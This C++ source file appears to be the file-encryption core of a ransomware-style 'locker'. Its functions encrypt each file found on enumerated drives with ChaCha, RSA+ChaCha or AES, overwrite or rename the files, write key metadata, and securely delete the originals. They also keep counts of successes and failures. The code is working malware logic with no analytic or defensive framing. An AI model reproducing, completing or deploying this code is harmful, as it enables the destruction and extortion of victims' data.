#include "locker.h"
#include "filesystem/filesystem.h"
#include "global_parameters.h"
#include "memory.h"
#include "logs.h"
#include "pathsystem.h"
#include "CommandParser.h"

#include <stdio.h>
#include <atomic>

std::atomic<size_t> op_succ{ 0 };
std::atomic<size_t> op_fail{ 0 };


bool locker::HandlerCrypt
(
	CRYPT_INFO* CryptInfo,
	PDRIVE_INFO data
)
{
 	bool success = false;
 	FILE_INFO FileInfo;
 	if (!(success = SetOptionFileInfo(&FileInfo, data, CryptInfo)))
 		goto END;

	if (!(success = CryptInfo->methods.algo_method(&FileInfo)))
		goto END;

	if (!CryptInfo->methods.overwrite_method(CryptInfo, FileInfo.filehandle, FileInfo.filesize))
		LOG_ERROR("[OverWriteFile] Failed; %s", data->Filename);

	if (CommandParser::signature &&
		CryptInfo->methods.hash_sum_method
		(
			CryptInfo,
			FileInfo.hblock->crypt ? FileInfo.filehandle : FileInfo.recent_filehandle,
			FileInfo.hblock->crypt ? FileInfo.filename : FileInfo.recent_filename,
			NULL
		));

END:
 	free_file_info(&FileInfo, data, success);
	return success;
}

bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo)
{
	*FileInfo = 
	{
		.dcrypt = (int)GLOBAL_ENUM.g_DeCrypt,
		.ctx = NULL,
		.crypt_info = CryptInfo,
		.filename = data->Filename,
		.recent_filename = NULL,
		.file_path = data->FullPath,
		.filehandle = INVALID_HANDLE_VALUE,
		.recent_filehandle = INVALID_HANDLE_VALUE,
		.filesize = 0,
		.padding = 0
	};
	
	if (CryptInfo->methods.gen_policy == GENKEY_EVERY_ONCE)
	{
		if (CryptInfo->methods.method_policy == CryptoPolicy::CHACHA
			|| CryptInfo->methods.method_policy == CryptoPolicy::RSA_CHACHA)
			FileInfo->ctx = (laced_ctx*)memory::m_malloc(sizeof(laced_ctx));
		else
			FileInfo->ctx = (crypto_aes_ctx*)memory::m_malloc(sizeof(crypto_aes_ctx));
	}
	else if (CryptInfo->methods.gen_policy == GENKEY_ONCE)
		FileInfo->ctx = CryptInfo->ctx;

	if (!api::get_parse_file(data->FullPath, &FileInfo->filehandle, &FileInfo->filesize) 
			|| FileInfo->filehandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; %s", data->Filename);
		return false;
	}

	if (!(FileInfo->hblock = filesystem::init_mdata_hblock(FileInfo))->status)
	{
		LOG_ERROR("[SetOptionFileInfo] [INIT_MEATA_HBLOCK] Failed; %s", data->Filename);
		return false;
	}
	
	if((FileInfo->recent_filename = filesystem::NameMethodState(FileInfo, data)) == NULL)
	 	return false;

	if(GLOBAL_STATE.g_write_in)
		FileInfo->recent_filehandle = FileInfo->filehandle;
	else if (!api::create_file_open(&FileInfo->recent_filehandle, FileInfo->recent_filename) 
			|| FileInfo->recent_filehandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed; %s", data->Filename);
		return false;
	}


	LOG_INFO("process file; %s -> %s", FileInfo->filename, &FileInfo->recent_filename[memory::StrLen(data->Path) + 1]);
	return true;
}

void locker::free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO data, bool success)
{
	if(success)
	{
		LOG_SUCCESS("success encrypt file; %s", data->Filename);
		op_succ.fetch_add(1, std::memory_order_relaxed);
		FileInfo->hblock->crypt ? 
			filesystem::write_metadata(FileInfo)
			:
			filesystem::delete_metadata(FileInfo->recent_filehandle, &FileInfo->filesize);
	}
	else
	{
		LOG_ERROR("failed encrypt file; %s", data->Filename);
		op_fail.fetch_add(1, std::memory_order_relaxed);
	}

	api::CloseDesc(FileInfo->filehandle);
	api::CloseDesc(FileInfo->recent_filehandle);

	if(success && GLOBAL_STATE.g_write_in)
		rename(FileInfo->file_path, FileInfo->recent_filename);
	else if(GLOBAL_STATE.g_FlagDelete && !CommandParser::UNSAFE)
	{
		PLIST_PSD data_st = new LIST_PSD;
		data_st->state = success;
		size_t len = memory::StrLen(data->FullPath);
		data_st->path = (char*)memory::m_malloc(len + 1);
		memcpy(data_st->path, data->FullPath, len);
		FileInfo->crypt_info->list_psd->LIST_INSERT_HEAD(data_st);
	}
	else 
	{
		if (!success) api::SecureDelete(FileInfo->recent_filename);
		else if (GLOBAL_STATE.g_FlagDelete) api::SecureDelete(FileInfo->file_path);
	}

	memory::m_free(FileInfo->recent_filename);
	if (FileInfo->crypt_info->methods.gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);

	filesystem::free_hblock_mdata(FileInfo->hblock);
	memory::memzero_explicit(FileInfo, sizeof(FILE_INFO));
	PathSystem::free_driveinfo_st(data);
}

std::pair<size_t, size_t> locker::get_count_op()
{
	return {op_succ.load(), op_fail.load()};
}

bool locker::safe_delete_file(LIST<LIST_PSD>* list_psd)
{
	if(!list_psd) return false;
	PLIST_PSD data = NULL;
	bool success = true;
	LIST_FOREACH(data, list_psd)
	{
		if(!data->state)
			success = false;
	}
	
	if(!success)
		goto end;
	
	LIST_FOREACH(data, list_psd)
		api::SecureDelete(data->path);

end:

	while(!list_psd->LIST_EMPTY())
	{
		memory::m_free(list_psd->LIST_HEAD_T()->path);
		list_psd->LIST_DELETE_HEAD();
	}
	
	return success;
}